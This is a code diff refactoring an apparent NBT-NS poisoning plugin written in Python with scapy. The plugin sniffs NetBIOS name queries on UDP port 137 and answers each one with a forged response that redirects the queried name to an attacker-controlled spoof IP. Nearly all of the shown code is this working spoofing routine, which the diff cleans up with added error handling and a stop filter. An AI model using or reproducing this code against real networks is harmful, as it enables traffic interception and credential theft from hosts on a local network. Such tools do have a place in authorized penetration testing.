@@ -25,37 +25,43 @@ class NBNSPlugin(ProtocolPlugin):
 
     async def _run(self) -> None:
         logger.info(f"[NBT-NS] Starting discovery on {self.interface}")
-        loop = asyncio.get_event_loop()
-        await loop.run_in_executor(None, self._sniff_blocking)
+        def stop_filter(p: Packet) -> bool:
+            return not self.running
 
-    def _sniff_blocking(self):
+        loop = asyncio.get_event_loop()
+        await loop.run_in_executor(None, self._sniff_blocking, stop_filter)
+
+    def _sniff_blocking(self, stop_filter: Any) -> None:
         sniff(
             iface=self.interface, 
             filter="udp port 137", 
             prn=self._handle_packet, 
             store=0, 
-            stop_filter=lambda x: not self.running
+            stop_filter=stop_filter
         )
 
-    def _handle_packet(self, packet: Packet):
+    def _handle_packet(self, packet: Packet) -> None:
         if NBNSQueryRequest in packet and packet[NBNSQueryRequest].FLAGS == 0x0110:
-            query_name = packet[NBNSQueryRequest].QUESTION_NAME.decode().rstrip()
-            logger.info(f"[NBT-NS] Intercepted query for {query_name} from {packet[IP].src}")
+            query_name = packet[NBNSQueryRequest].QUESTION_NAME.decode(errors='ignore').rstrip()
+            source_ip = packet[IP].src if IP in packet else "Unknown"
             
-            resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
-                   UDP(dport=packet[UDP].sport, sport=137) / \
-                   NBNSQueryResponse(
-                       NAME_TRN_ID=packet[NBNSQueryRequest].NAME_TRN_ID,
-                       FLAGS=0x8500,
-                       QDCOUNT=0,
-                       ANCOUNT=1,
-                       ADDR_ENTRY=[NBNSResourceRecord(
-                           RR_NAME=packet[NBNSQueryRequest].QUESTION_NAME,
-                           SUFFIX=packet[NBNSQueryRequest].SUFFIX,
-                           ADDR=self.spoof_ip
-                       )]
-                   )
+            logger.info(f"[NBT-NS] Intercepted query for {query_name} from {source_ip}")
             
-            send(resp, iface=self.interface, verbose=False)
-            logger.info(f"[NBT-NS] Spoofed response sent to {packet[IP].src}")
+            if IP in packet and UDP in packet:
+                resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
+                       UDP(dport=packet[UDP].sport, sport=137) / \
+                       NBNSQueryResponse(
+                           NAME_TRN_ID=packet[NBNSQueryRequest].NAME_TRN_ID,
+                           FLAGS=0x8500,
+                           QDCOUNT=0,
+                           ANCOUNT=1,
+                           ADDR_ENTRY=[NBNSResourceRecord(
+                               RR_NAME=packet[NBNSQueryRequest].QUESTION_NAME,
+                               SUFFIX=packet[NBNSQueryRequest].SUFFIX,
+                               ADDR=self.spoof_ip
+                           )]
+                       )
+                
+                send(resp, iface=self.interface, verbose=False)
+                logger.info(f"[NBT-NS] Spoofed response sent to {packet[IP].src}")
 
